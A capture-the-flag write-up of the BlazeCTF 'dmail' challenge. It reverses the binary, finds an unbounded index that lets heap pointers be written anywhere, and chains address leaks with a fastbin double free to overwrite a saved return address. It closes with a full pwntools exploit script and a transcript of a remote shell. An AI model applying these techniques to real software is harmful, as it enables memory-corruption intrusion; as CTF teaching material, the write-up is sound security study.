---
layout: post
title: "BlazeCTF - dmail"
date: 2016-04-24 01:00
categories: ctf exploit
---

BlazeCTF seems to be underrated because the challenge were very demanding and fun! That challenge is about leveraging the possibility to write addresses returned by `malloc` anywhere in the memory. I used that issue, to leak a heap address, a libc address and a stack address, to trick `malloc` into giving me a pointer on the stack and by overwriting the saved return pointer.

The write-up starts with some [basic information](#basic-information) on the binary. Then the [operation](#operation) with an analysis of each function is presented. It is followed by a listing of the [vulnerabilities](#vulnerabilities) found in the previously analyzed functions. The [exploitation](#exploitation) section shows the different steps needed to finally get a remote shell.

# Basic information

From the organizers:

```
dmail is dealermail, its super secret email for only the top dealers

Host is ubuntu 14.04

107.170.17.158 4201
```

The binary is a stripped ELF 64-bit with all the security features activated.

```bash
$ file dmail
dmail: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24,
BuildID[sha1]=866d76864a17f0ced0dee2d543f4d949fea487e1, stripped

$ checksec --file dmail
RELRO           STACK CANARY      NX            PIE             RPATH
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH
RUNPATH      FILE
No RUNPATH   dmail
```

# Operation

`dmail` is supposed to be a simple mail client that can:

* create email;
* read created email;
* delete created email.

Here is the greeting message followed by the main menu, which are printed by two functions:

```bash
$ ./dmail
 Welcome to DISCRETE-MAIL
 ==========================
 Features:
  - Secured with SHA-256 Encryption!
  - Simple Interface!
  - Completely FREE
 ==========================

1 -> send mail
2 -> read mail
3 -> delete mail
>
```

The following subsection shows the analysis of the functions:

* [`main`](#main): the main function where the menu is shown and the call to the wanted function is done;
* [`read_int`](#readint): a helper function to read an unsigned integer from the standard input;
* [`set_cubby`](#setcubby): a helper function to set whether the cubby is used or not;
* [`is_cubby_set`](#iscubbyset): a helper function to check if a cubby is set;
* [`choice_send_mail`](#choicesendmail): a function called by `main` to send a mail;
* [`create_mail`](#createmail): a function called by `choice_send_mail` to allocate the memory for the mail;
* [`choice_read_mail`](#choicereadmail): a function called by `main` to show the content of a mail;
* [`choice_delete_mail`](#choicedeletemail): a function called by `main` to delete a mail.

## main

It starts by allocating `0x100` (256) bytes. The address of that memory region is stored in the `.BSS` segment at the relative address `0x202020` (PIE is activated therefore everything is relative). It then prints the menu, reads an integer from the standard input and calls the function corresponding to the choice made:

```
0x00000eda      55             push rbp
0x00000edb      4889e5         mov rbp, rsp
0x00000ede      4883ec10       sub rsp, 0x10
0x00000ee2      b800000000     mov eax, 0
0x00000ee7      e8f9fbffff     call do_setvbuf
0x00000eec      e85efcffff     call print_welcome
0x00000ef1      bf00010000     mov edi, 0x100
0x00000ef6      e885faffff     call sym.imp.malloc
0x00000efb      4889c2         mov rdx, rax
0x00000efe      488d051b1120.  lea rax, qword [rip + 0x20111b] ; 0x202020
0x00000f05      488910         mov qword [rax], rdx
0x00000f08      488d05111120.  lea rax, qword [rip + 0x201111] ; 0x202020
0x00000f0f      488b00         mov rax, qword [rax]
0x00000f12      4885c0         test rax, rax
0x00000f15      750c           jne 0xf23
0x00000f17      488d3d740200.  lea rdi, qword [rip + section..note.gnu.buid_id]
0x00000f1e      e80afcffff     call sub.perror_b2d
0x00000f23      488d05f61020.  lea rax, qword [rip + 0x2010f6] ; 0x202020
0x00000f2a      488b00         mov rax, qword [rax]
0x00000f2d      ba00010000     mov edx, 0x100
0x00000f32      be00000000     mov esi, 0
0x00000f37      4889c7         mov rdi, rax
0x00000f3a      e8f1f9ffff     call sym.imp.memset
0x00000f3f      e871fcffff     call print_menu
0x00000f44      e8a7fcffff     call read_int
0x00000f49      488945f8       mov qword [rbp - local_8h], rax
0x00000f4d      488b45f8       mov rax, qword [rbp - local_8h]
0x00000f51      4883f802       cmp rax, 2
0x00000f55      7413           je 0xf6a
0x00000f57      4883f803       cmp rax, 3
0x00000f5b      7414           je 0xf71
0x00000f5d      4883f801       cmp rax, 1
0x00000f61      7515           jne 0xf78
0x00000f63      e831feffff     call choice_send_mail
0x00000f68      eb1c           jmp 0xf86
0x00000f6a      e80affffff     call choice_read_mail
0x00000f6f      eb15           jmp 0xf86
0x00000f71      e87bfeffff     call choice_delete_mail
0x00000f76      eb0e           jmp 0xf86
0x00000f78      488d3d300200.  lea rdi, qword [rip + 0x230]
0x00000f7f      e87cf9ffff     call sym.imp.puts
0x00000f84      ebb9           jmp 0xf3f
0x00000f86      ebb7           jmp 0xf3f
```

## read_int

The function I called `read_int` reads 16 bytes from `stdin`, saves the content into a local array on the stack and returns the conversion of the string into an unsigned 64-bit integer done by [`strtoull`][strtoull]:

```
0x00000bf0      55             push rbp
0x00000bf1      4889e5         mov rbp, rsp
0x00000bf4      4883ec20       sub rsp, 0x20
0x00000bf8      64488b042528.  mov rax, qword fs:[0x28]
0x00000c01      488945f8       mov qword [rbp - local_8h], rax
0x00000c05      31c0           xor eax, eax
0x00000c07      488b05ca1320.  mov rax, qword [rip + 0x2013ca]
0x00000c0e      488b10         mov rdx, qword [rax]
0x00000c11      488d45e0       lea rax, qword [rbp - local_20h]
0x00000c15      be10000000     mov esi, 0x10
0x00000c1a      4889c7         mov rdi, rax
0x00000c1d      e82efdffff     call sym.imp.fgets
0x00000c22      488d45e0       lea rax, qword [rbp - local_20h]
0x00000c26      ba0a000000     mov edx, 0xa
0x00000c2b      be00000000     mov esi, 0
0x00000c30      4889c7         mov rdi, rax
0x00000c33      e828fdffff     call sym.imp.strtoull
0x00000c38      488b4df8       mov rcx, qword [rbp - local_8h]
0x00000c3c      6448330c2528.  xor rcx, qword fs:[0x28]
0x00000c45      7405           je 0xc4c
0x00000c47      e8c4fcffff     call sym.imp.__stack_chk_fail
0x00000c4c      c9             leave
0x00000c4d      c3             ret
```

That function is used each time an integer must be read.

## set_cubby

That function is used whenever the state of a cubby is changed from used to free and vice versa. It shifts left `1` by the cubby number and use that result to xor a value in the `.BSS` located at the relative address `0x202018`.

```
0x00000c8e      55             push rbp
0x00000c8f      4889e5         mov rbp, rsp
0x00000c92      897dfc         mov dword [rbp - local_4h], edi
0x00000c95      8b45fc         mov eax, dword [rbp - local_4h]
0x00000c98      ba01000000     mov edx, 1
0x00000c9d      89c1           mov ecx, eax
0x00000c9f      d3e2           shl edx, cl
0x00000ca1      89d0           mov eax, edx
0x00000ca3      4863d0         movsxd rdx, eax
0x00000ca6      488d056b1320.  lea rax, qword [rip + 0x20136b] ; 0x202018
0x00000cad      488b00         mov rax, qword [rax]
0x00000cb0      4831c2         xor rdx, rax
0x00000cb3      488d055e1320.  lea rax, qword [rip + 0x20135e] ; 0x202018
0x00000cba      488910         mov qword [rax], rdx
0x00000cbd      5d             pop rbp
0x00000cbe      c3             ret
```

As the cubby number is not bounded some strange behavior can be expected on the shift.

## is_cubby_set

That function is used to check whether a cubby is used or free. It takes the value at `0x202018`, shifts it right by the cubby number and return the result "bit-wise-and" with `1`. `0` is considered false and `1` or any other value, true.

```
0x00000c4e      55             push rbp
0x00000c4f      4889e5         mov rbp, rsp
0x00000c52      897dfc         mov dword [rbp - local_4h], edi
0x00000c55      488d05bc1320.  lea rax, qword [rip + 0x2013bc] ; 0x202018
0x00000c5c      488b10         mov rdx, qword [rax]
0x00000c5f      8b45fc         mov eax, dword [rbp - local_4h]
0x00000c62      89c1           mov ecx, eax
0x00000c64      48d3ea         shr rdx, cl
0x00000c67      4889d0         mov rax, rdx
0x00000c6a      83e001         and eax, 1
0x00000c6d      5d             pop rbp
0x00000c6e      c3             ret
```

We should also expect some strange behavior here.

There is another function that I called `is_cubby_not_set` which returns `1` if `is_cubby_set` returns `0`, and `0` otherwise:

```C
return is_cubby_set(cubby) == 0;
```

## choice_send_mail

When the first option `1 -> send mail` is chosen, three things must be given:

```bash
1 -> send mail
2 -> read mail
3 -> delete mail
> 1
 cubby: 0
  length: 10
  body: AAAAAAAA
```

* a cubby number that is used as an identification number;
* the size of the mail;
* its content.

These three steps are not handled by that function. It only asks for the cubby number and checks whether it is occupied. If the cubby is free, it calls the function `create_mail` that is explained in the next subsection.

```
0x00000d99      55             push rbp
0x00000d9a      4889e5         mov rbp, rsp
0x00000d9d      4883ec10       sub rsp, 0x10
0x00000da1      488d3d880300.  lea rdi, qword [rip + 0x388]
0x00000da8      b800000000     mov eax, 0
0x00000dad      e86efbffff     call sym.imp.printf
0x00000db2      e839feffff     call read_int
0x00000db7      488945f8       mov qword [rbp - local_8h], rax
0x00000dbb      488b45f8       mov rax, qword [rbp - local_8h]
0x00000dbf      89c7           mov edi, eax
0x00000dc1      e8a9feffff     call is_cubby_not_set
0x00000dc6      85c0           test eax, eax
0x00000dc8      7419           je 0xde3
0x00000dca      488b45f8       mov rax, qword [rbp - local_8h]
0x00000dce      4889c7         mov rdi, rax
0x00000dd1      e8e9feffff     call create_mail
0x00000dd6      488b45f8       mov rax, qword [rbp - local_8h]
0x00000dda      89c7           mov edi, eax
0x00000ddc      e8adfeffff     call set_cubby
0x00000de1      eb0c           jmp 0xdef
0x00000de3      488d3d560300.  lea rdi, qword [rip + 0x356]
0x00000dea      e811fbffff     call sym.imp.puts
0x00000def      c9             leave
0x00000df0      c3             ret
```

One thing that we can already see is that regardless of the outcome of the `create_mail` function, the call to `set_cubby` is done.

## create_mail

That function asks for the size of the mail and if it is smaller than `0x100` (256) bytes, it allocates the memory and copy the content (`body`) read from `stdin` into that newly allocated region:

```
0x00000cbf      55             push rbp
0x00000cc0      4889e5         mov rbp, rsp
0x00000cc3      53             push rbx
0x00000cc4      4883ec28       sub rsp, 0x28
0x00000cc8      48897dd8       mov qword [rbp - local_28h], rdi
0x00000ccc      488d3d0f0400.  lea rdi, qword [rip + 0x40f]
0x00000cd3      b800000000     mov eax, 0
0x00000cd8      e843fcffff     call sym.imp.printf
0x00000cdd      e80effffff     call read_int
0x00000ce2      488945e8       mov qword [rbp - local_18h], rax
0x00000ce6      48817de80001.  cmp qword [rbp - local_18h], 0x100
0x00000cee      7611           jbe 0xd01
0x00000cf0      488d3df60300.  lea rdi, qword [rip + 0x3f6]
0x00000cf7      e804fcffff     call sym.imp.puts
0x00000cfc      e991000000     jmp 0xd92
0x00000d01      488d05181320.  lea rax, qword [rip + 0x201318] ; 0x202020
0x00000d08      488b00         mov rax, qword [rax]
0x00000d0b      488b55d8       mov rdx, qword [rbp - local_28h]
0x00000d0f      48c1e203       shl rdx, 3
0x00000d13      488d1c10       lea rbx, qword [rax + rdx]
0x00000d17      488b45e8       mov rax, qword [rbp - local_18h]
0x00000d1b      4889c7         mov rdi, rax
0x00000d1e      e85dfcffff     call sym.imp.malloc
0x00000d23      488903         mov qword [rbx], rax
0x00000d26      488d05f31220.  lea rax, qword [rip + 0x2012f3] ; 0x202020
0x00000d2d      488b00         mov rax, qword [rax]
0x00000d30      488b55d8       mov rdx, qword [rbp - local_28h]
0x00000d34      48c1e203       shl rdx, 3
0x00000d38      4801d0         add rax, rdx
0x00000d3b      488b00         mov rax, qword [rax]
0x00000d3e      4885c0         test rax, rax
0x00000d41      750c           jne 0xd4f
0x00000d43      488d3db60300.  lea rdi, qword [rip + 0x3b6]
iled to allocate space for new mail" @ 0x1100
0x00000d4a      e8defdffff     call sub.perror_b2d
; JMP XREF from 0x00000d41 (create_mail)
0x00000d4f      488d3dd10300.  lea rdi, qword [rip + 0x3d1]
0x00000d56      b800000000     mov eax, 0
0x00000d5b      e8c0fbffff     call sym.imp.printf
0x00000d60      488b05711220.  mov rax, qword [rip + 0x201271] ;

0x00000d67      488b10         mov rdx, qword [rax]
0x00000d6a      488b45e8       mov rax, qword [rbp - local_18h]
0x00000d6e      89c1           mov ecx, eax
0x00000d70      488d05a91220.  lea rax, qword [rip + 0x2012a9] ; 0x202020
0x00000d77      488b00         mov rax, qword [rax]
0x00000d7a      488b75d8       mov rsi, qword [rbp - local_28h]
0x00000d7e      48c1e603       shl rsi, 3
0x00000d82      4801f0         add rax, rsi
0x00000d85      488b00         mov rax, qword [rax]
0x00000d88      89ce           mov esi, ecx
0x00000d8a      4889c7         mov rdi, rax
0x00000d8d      e8befbffff     call sym.imp.fgets
; JMP XREF from 0x00000cfc (create_mail)
0x00000d92      4883c428       add rsp, 0x28
0x00000d96      5b             pop rbx
0x00000d97      5d             pop rbp
0x00000d98      c3             ret
```

More precisely the address returned by malloc is stored at the address saved in `0x202020` plus on offset that is the cubby number multiplied by 8 (or shifted left by 3):
`cubby_address = *(0x202020) + (cubby_number * 8)`

As the cubby number is not bounded, we might be able to store the address wherever we want.

Here is a layout of the heap after a few mails have been created (the chunks with the headers are shown):

```
+--------------+ cubbies' addresses
| chunk header |
|              |
| cubby 0 addr | <= address stored in 0x202020
| cubby 1 addr |
. ...          .
+--------------+ cubby 0's chunk
| chunk header |
|              |
| data ...     | <= cubby 0 addr
. ...          .
+--------------+ cubby 1's chunk
| chunk header |
|              |
| data ...     | <= cubby 1 addr
. ...          .
+--------------+
. etc.         .

```

## choice_read_mail

```bash
1 -> send mail
2 -> read mail
3 -> delete mail
> 2
 cubby: 0
AAAAAAAA
```

That function asks for the cubby number and prints its content if the cubby is used:

```
0x00000e79      55             push rbp
0x00000e7a      4889e5         mov rbp, rsp
0x00000e7d      4883ec10       sub rsp, 0x10
0x00000e81      488d3da80200.  lea rdi, qword [rip + 0x2a8]
0x00000e88      b800000000     mov eax, 0
0x00000e8d      e88efaffff     call sym.imp.printf
0x00000e92      e859fdffff     call read_int
0x00000e97      488945f8       mov qword [rbp - local_8h], rax
0x00000e9b      488b45f8       mov rax, qword [rbp - local_8h]
0x00000e9f      89c7           mov edi, eax
0x00000ea1      e8a8fdffff     call is_cubby_set
0x00000ea6      85c0           test eax, eax
0x00000ea8      7422           je 0xecc
0x00000eaa      488d056f1120.  lea rax, qword [rip + 0x20116f] ; 0x202020
0x00000eb1      488b00         mov rax, qword [rax]
0x00000eb4      488b55f8       mov rdx, qword [rbp - local_8h]
0x00000eb8      48c1e203       shl rdx, 3
0x00000ebc      4801d0         add rax, rdx
0x00000ebf      488b00         mov rax, qword [rax]
0x00000ec2      4889c7         mov rdi, rax
0x00000ec5      e836faffff     call sym.imp.puts
0x00000eca      eb0c           jmp 0xed8
0x00000ecc      488d3dad0200.  lea rdi, qword [rip + 0x2ad]
0x00000ed3      e828faffff     call sym.imp.puts
0x00000ed8      c9             leave
0x00000ed9      c3             ret
```

The same formula is used to get the address of the cubby:
`cubby_address = *(0x202020) + (cubby_number * 8)`

## choice_delete_mail

```bash
1 -> send mail
2 -> read mail
3 -> delete mail
> 3
 cubby: 0
```

That function asks for the cubby number and `free` the cubby and calls `set_cubby` if it is used:

```
0x00000df1      55             push rbp
0x00000df2      4889e5         mov rbp, rsp
0x00000df5      4883ec10       sub rsp, 0x10
0x00000df9      488d3d300300.  lea rdi, qword [rip + 0x330]
0x00000e00      b800000000     mov eax, 0
0x00000e05      e816fbffff     call sym.imp.printf
0x00000e0a      e8e1fdffff     call read_int
0x00000e0f      488945f8       mov qword [rbp - local_8h], rax
0x00000e13      488b45f8       mov rax, qword [rbp - local_8h]
0x00000e17      89c7           mov edi, eax
0x00000e19      e830feffff     call is_cubby_set
0x00000e1e      85c0           test eax, eax
0x00000e20      7449           je 0xe6b
0x00000e22      488d05f71120.  lea rax, qword [rip + 0x2011f7] ; 0x202020
0x00000e29      488b00         mov rax, qword [rax]
0x00000e2c      488b55f8       mov rdx, qword [rbp - local_8h]
0x00000e30      48c1e203       shl rdx, 3
0x00000e34      4801d0         add rax, rdx
0x00000e37      488b00         mov rax, qword [rax]
0x00000e3a      4889c7         mov rdi, rax
0x00000e3d      e8aefaffff     call sym.imp.free
0x00000e42      488d05d71120.  lea rax, qword [rip + 0x2011d7] ; 0x202020
0x00000e49      488b00         mov rax, qword [rax]
0x00000e4c      488b55f8       mov rdx, qword [rbp - local_8h]
0x00000e50      48c1e203       shl rdx, 3
0x00000e54      4801d0         add rax, rdx
0x00000e57      48c700000000.  mov qword [rax], 0
0x00000e5e      488b45f8       mov rax, qword [rbp - local_8h]
0x00000e62      89c7           mov edi, eax
0x00000e64      e825feffff     call set_cubby
0x00000e69      eb0c           jmp 0xe77
0x00000e6b      488d3dee0200.  lea rdi, qword [rip + 0x2ee]
0x00000e72      e889faffff     call sym.imp.puts
0x00000e77      c9             leave
0x00000e78      c3             ret
```

# Vulnerabilities

During the analysis, we have encountered one vulnerability that have multiple consequences. The fact that the cubby number is not bounded, we can:

* write addresses returned by `malloc` where we want;
* trick the program to think that a cubby is used or not.

There is also the fact that we can set a cubby to used and avoid memory allocation if we give a size that is bigger of equal to 256.

## Malloc addresses

As shown in [main](#main), the first malloc is done to allocate a space to store the addresses of 32 cubbies:
`size / size_of_a_pointer = 0x100 / 8 = 32`
If, when we create a mail, we set the cubby number to something higher than 32 we start to write data on other chunks

## Trick the shifts

When a shift is done with a value that is to big, it's behavior is "not determined". Here the shift is done on a 32-bit value:

```
0x00000c98      ba01000000     mov edx, 1
0x00000c9d      89c1           mov ecx, eax
0x00000c9f      d3e2           shl edx, cl
```

Which means that we will have strange effects when we choose a cubby number near 32. I wrote a small program to show that behavior:

```c
#include <stdlib.h>
#include <stdio.h>

int main(void)
{

  long long n,i,j;
  char s[16];
  while (1) {
    if (!fgets(&s, 16, stdin)) {
      break;
    }
    n = strtoll(&s, 0, 10);
    i = 1 << n;
    printf("1 << %lld = 0x%016llx\n", n, i);
    j = i >> n;
    printf("0x%016llx >> %lld = %lld\n", i, n, j);
  }

  exit(0);
}
```

We can see that everything is OK until `30` but then with `31` we have a really strange value and with `32` we loop back to `0`

```bash
$ ./shift 
30
1 << 30 = 0x0000000040000000
0x0000000040000000 >> 30 = 1
31
1 << 31 = 0xffffffff80000000
0xffffffff80000000 >> 31 = -1
32
1 << 32 = 0x0000000000000001
0x0000000000000001 >> 32 = 0
```

Consequences:

* cubby number equal to or higher than `32`, can't be freed because the check to see if they are used will fail;
* cubby number `31` breaks the check and once created will trick the program into believing that any cubby with a number equal to or higher than `32` is used.

# Exploitation

All security features are set (except for [PaX & grsecurity][grsec]):

* Full RELRO: we can't overwrite an entry in the global offset table (GOT), therefore we need to overwrite a saved `rip` value on the stack;
* PIE (and ASLR): every part of the program are located at random locations in the memory, therefore we need to leak addresses to finally find one on the stack.

This leads to the following steps that need to be done in order to execute a shell:

* leak a heap address;
* leak a libc address;
* leak a stack address;
* trick `malloc` into allocating a chunk on the stack (yes you can!);
* overwrite `saved rip` with the address of the [magic gadget][magicgadget].

## Leaks

### Heap address

The heap address is easy to leak, because we only have to create a cubby, create another with a number that will make its address being stored into the first cubby and read the first cubby:

```bash
$ nc 107.170.17.158 4201
 Welcome to DISCRETE-MAIL
 ==========================
 Features:
  - Secured with SHA-256 Encryption!
  - Simple Interface!
  - Completely FREE
 ==========================

1 -> send mail
2 -> read mail
3 -> delete mail
> 1
 cubby: 0
  length: 256
  body: AAAAAAAA
1 -> send mail
2 -> read mail
3 -> delete mail
> 1
 cubby: 34
  length: 256
  body: BBBBBBBB
1 -> send mail
2 -> read mail
3 -> delete mail
> 2
 cubby: 0
@A²T
1 -> send mail
2 -> read mail
3 -> delete mail
>
```

Instead of printing `AAAAAAAA` we have the address of the second cubby. Note that the number of the second cubby is `34` because we want to write passed the header of the chunk of the first cubby. With `32` we would have overwritten the first part of its header and with `33`, the second part, which are used to store the size of the previous chunk and the size of the chunk respectively. For more information about the heap please read that [post][post].

### Libc address

When smallchunks (not fastchunks) are `free`'d, there are put in a double-linked free list and pointers to the previous and next chunks are stored in the chunk. When the chunk is at the beginning of the list or at the end, it will have a pointer to the main arena in the libc. We can use that to leak a libc pointer. To do that we have to:

* create cubby `0` with its content being an address of a previously `free`'d cubby;
* create the cubby `31` with a size bigger than 256. This has two effects:
  * trick the program into believing that cubbies `32` and following are used;
  * prevent an allocation of a chunk because the size is too big;
* read the content of cubby `34`.

### Stack address

The libc has a pointer to the environment variables that are located on the stack, which is stored in the `environ` variable:

```bash
gdb-peda$ p &environ
$1 = (<data variable, no debug info> *) 0x7ffff7dd5f78 <environ>
gdb-peda$ x/gx 0x7ffff7dd5f78
0x7ffff7dd5f78 <environ>:	0x00007fffffffde18
gdb-peda$ vmmap
Start              End                Perm	Name
[snip]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
[snip]
```

To leak the pointer address we need to:

* calculate the offset from the previously leaked libc address to `environ`;
* create cubby `0` with its content being the address of `environ`;
* read the content of cubby `34`.

We now have defeated ALSR and PIE!

### Libc offsets

To find the good offsets for `environ` and the [magic gadget][magicgadget], the correct libc must be used. In the description of the challenge it states that the target is an Ubuntu 14.04. In the best case the target was updated with the latest package before the CTF. When I managed to get a shell on my Ubuntu VM, it didn't work on the target even if the offset of `environ` was good and I was able to get a correct stack address.

We can see that two possible libc can be installed:

```bash
user@ubuntu:~$ apt-cache policy libc6
libc6:
  Installed: 2.19-0ubuntu6.7
  Candidate: 2.19-0ubuntu6.7
  Version table:
 *** 2.19-0ubuntu6.7 0
        500 http://archive.ubuntu.com/ubuntu/ trusty-updates/main amd64 Packages
        500 http://security.ubuntu.com/ubuntu/ trusty-security/main amd64 Packages
        100 /var/lib/dpkg/status
     2.19-0ubuntu6 0
        500 http://archive.ubuntu.com/ubuntu/ trusty/main amd64 Packages
```

The problem was that the challenge is run in a chrooted environment (many challenges target the same IP address) and the tool to easily create them on Ubuntu ([`debootstrap`][debootstrap]) only set the last repository. Therefore the older libc was installed.

In the worst case scenario, if the libc could not have been guessed, I could have leaked it using the same technique I used to leak the stack address.

## Trick malloc

By playing with fastchunks, it is possible to easily trick `malloc` into returning an arbitrary address. We will use that to allocate a cubby on the stack near the `saved rip` of the function `create_mail`. That function has no canary. If it would have had one, we could have used the above technique to leak it and then recreate it during our overwrite of `saved rip`.

The idea is to introduce the address we want into the free list by doing a double free on a cubby. With that we will be able to add an arbitrary address (stack) in the free list. With fastchunks, `malloc` performs only one [check to ensure that the memory is not corrupted][check]: it check that the `size` on the soon to be allocated chunk is a valid size for the current bin. Therefore we need a value in the stack near `saved_rip` that we can control.

When `malloc` is called in `create_mail` the cubby number and the size requested are on the stack:

```
gdb-peda$ x/8gx 0x7fffffffdcb0
0x7fffffffdcb0:	0x0000000000000000	0x000000000000002c <= cubby number
0x7fffffffdcc0:	0x00007fffffffdce0	0x0000000000000040 <= size
0x7fffffffdcd0:	0x0000000000000000	0x0000000000000000
0x7fffffffdce0:	0x00007fffffffdd00	0x0000555555554dd6 <= saved_rip
```

If we use the size to trick `malloc`, the check will never work because when a cubby is allocated, `malloc` rounds the size of the cubby to the size of a chunk and it is not possible to make them equal. Here is a simple program that proves it by allocating chunks and showing the difference between the requested size and the size in the chunk header:

```c
#include <stdlib.h>
#include <stdio.h>

int main(void)
{
  long long i;
  long long *a;
  for (i = 0; i < 0x90; i += 2) {
    a = malloc(i);
    printf("0x%llx => 0x%llx\n", i , *(a-1)-1);
    free(a);
    a = NULL;
  }
  exit(0);
}
```

Here is its output:

```
$ ./malloc 
0x0 => 0x20
0x2 => 0x20
0x4 => 0x20
0x6 => 0x20
0x8 => 0x20
0xa => 0x20
0xc => 0x20
0xe => 0x20
0x10 => 0x20
0x12 => 0x20
0x14 => 0x20
0x16 => 0x20
0x18 => 0x20
0x1a => 0x30
0x1c => 0x30
0x1e => 0x30
0x20 => 0x30
0x22 => 0x30
0x24 => 0x30
0x26 => 0x30
0x28 => 0x30
0x2a => 0x40
0x2c => 0x40
0x2e => 0x40
0x30 => 0x40
[snip]
0x38 => 0x40
[snip]
```

However we can used to the cubby number and set it to a value that will pass the test, in that case `0x38` for the size and `0x40` for the cubby number (other correct combinations can work as long as we stay in the fastchunk range). Here are the steps needed to trick `malloc`:

* decide of a fixed size (e.g. `0x38`) that will be used for all cubbies except `0`;
* create cubby `0` with a small size  and its content to the address of the cubby that we will free twice (cubby `1`);
* create cubby `1`, `2` and `3` (the content is not important);
* delete cubby `1` and `2`, the free list has `[cubby_2_addr cubby_1_addr]`;
* delete cubby `34`, it `free`s the chunk of cubby `1` a second time, the free list has `[cubby_1_addr cubby_2_addr cubby_1_addr]`;
* create cubby `1` with the address of the beginning of the chunk (header) that will be on the stack;
* create cubby `2`, the free list has only the address of cubby `1` left `[cubby_1_addr]`;
* create cubby `1`, when this happens `malloc` looks at the pointer in cubby `1` as if it was a pointer to the next free chunk and stores it in the free list. The next `malloc` will return the address on the stack ( + 16 because of the chunk header);
* create cubby `0x40`, with the address of the [magic gadget][magicgadget].

## Payload

Here is the resulting script:

```python
#!/usr/bin/env python2

from pwn import *

PRINT=False
ARRAY_SIZE = 0x110
ENVIRON_OFFSET = 0x2ce8
RIP_OFFSET = -304
MAGIC_OFFSET = -3641308

r = remote('107.170.17.158', 4201)
#r = remote('192.168.122.218', 4201)
# socat tcp-l:4201,reuseaddr,fork exec:./dmail

def recvuntil(rec, p=PRINT):
    global r
    data = r.recvuntil(rec)
    if p:
        print(data)
    return data

def sendline(msg, p=PRINT):
    global r
    r.sendline(msg)

def sr(rec, msg, p=PRINT):
    recvuntil(rec, p)
    sendline(msg, p)
    if p:
        print(msg)

def send_bad_mail(n, size=257, p=PRINT):
    sr('\n> ', '1', p)
    sr('cubby: ', '{}'.format(n), p)
    sr('length: ', '{}'.format(size), p)

def send_mail(n, size, body, p=PRINT):
    send_bad_mail(n, size, p)
    sr('body: ', body, p)

def read_mail(n, p=PRINT):
    sr('\n> ', '2', p)
    sr('cubby: ', '{}'.format(n), p)
    data = r.recvline(False)
    if p:
        print(data)
    return data

def delete_mail(n, p=PRINT):
    sr('\n> ', '3', p)
    sr('cubby: ', '{}'.format(n), p)

def get_addr(data):
    addr = data + '\0' * (8 - len(data))
    return u64(addr)

if __name__ == '__main__':

    ########
    # LEAK #
    ########

    # size big enough to avoid fastbins => have a pointer to the main arena,
    # which reside in the libc!
    CHUNK_SIZE = 256
    # cubby 0: placeholder for heap address to leak
    send_mail(0, CHUNK_SIZE, 'A' * 8)
    # place a malloc'ed address into cubby 0
    send_mail(ARRAY_SIZE // 8, CHUNK_SIZE, 'B' * 8)
    heap_addr = get_addr(read_mail(0))
    base_cubbies = heap_addr - 0x10 - CHUNK_SIZE
    cubbies_addr = base_cubbies - ARRAY_SIZE
    log.warn('Leaked heap_addr: 0x{:016x}'.format(heap_addr))
    log.warn(' => base_cubbies: 0x{:016x}'.format(base_cubbies))
    log.warn(' => cubbies_addr: 0x{:016x}'.format(cubbies_addr))

    # partial clean
    delete_mail(0)

    # leak libc_free address (a bin in the main arena)
    send_mail(0, 16, p64(base_cubbies + 32)) # @base_cubbies
    send_bad_mail(31)
    libc_addr = get_addr(read_mail(ARRAY_SIZE // 8))
    magic_gadget = libc_addr + MAGIC_OFFSET
    log.warn('Leaked libc_addr: 0x{:016x}'.format(libc_addr))
    log.warn(' => magic_gadget: 0x{:016x}'.format(magic_gadget))

    # clean
    delete_mail(0)
    send_mail(0, 16, p64(base_cubbies + 0x110))
    delete_mail(ARRAY_SIZE // 8)
    delete_mail(0)

    # leak stack addr
    send_mail(0,16, p64(libc_addr + ENVIRON_OFFSET))
    stack_addr = get_addr(read_mail(ARRAY_SIZE // 8))
    saved_rip = stack_addr + RIP_OFFSET
    log.warn('Leaked stack_addr: 0x{:016x}'.format(stack_addr))
    log.warn(' => &saved_rip:    0x{:016x}'.format(saved_rip))
    delete_mail(0)

    ################
    # trick malloc #
    ################

    size = 0x38
    # create a pointer to a chunk so that we can free it twice
    send_mail(0, 16, p64(base_cubbies + 32))
    # Create 3 chunks
    for i in range(1, 4):
        send_mail(i, size, p8(0x60 + i) * 8)

    # Delete cubby 1 then 2
    delete_mail(1)
    delete_mail(2)

    # Delete 1 again
    delete_mail(ARRAY_SIZE // 8)

    # remove the trick with 31
    delete_mail(31)

    # with the loop on shift, 34 is equivalent to 2
    delete_mail(2)

    # Create again cubbies 1 and 2
    log.warn('Storing 0x{0:016x} in the chunk'.format(saved_rip - 0x30-8))
    send_mail(1, size, p64(saved_rip - 0x30 - 8))
    send_mail(2, size, 'd' * 8)

    send_mail(4, size, 'e' * 8)
    delete_mail(0)
    send_mail(0x40, size, 'A'*40 + p64(magic_gadget))
    r.clean()
    r.interactive()
```

And here is the result (note that if an address that we send contains a new line, it will fail):

```bash
$ ./payload.py 
[+] Opening connection to 107.170.17.158 on port 4201: Done
[!] Leaked heap_addr: 0x00007ff0841e5230
[!]  => base_cubbies: 0x00007ff0841e5120
[!]  => cubbies_addr: 0x00007ff0841e5010
[!] Leaked libc_addr: 0x00007ff082a537b8
[!]  => magic_gadget: 0x00007ff0826da7dc
[!] Leaked stack_addr: 0x00007ffe34824ab8
[!]  => &saved_rip:    0x00007ffe34824988
[!] Storing 0x00007ffe34824950 in the chunk
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd home
$ ls
dmail
$ cd dmail
$ ls
dmail
dmail_flag
$ cat dmail_flag
blaze{Congratulations, you've unlocked your first BlazeCTF recipe, DANK GARLICBREAD, the recipes button above the scoreboard should now be unlocked}

```

I am still looking for the recipes...

[strtoull]: http://man7.org/linux/man-pages/man3/strtol.3.html
[grsec]: https://en.wikipedia.org/wiki/Grsecurity
[post]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
[magicgadget]: {% post_url 2016-03-30-Radare2-of-the-Lost-Magic-Gadget %}
[check]: https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ea97df2cb4b18017bcd0c7278b85b227d6c9f720;hb=HEAD#l3374
[debootstrap]: https://wiki.debian.org/Debootstrap
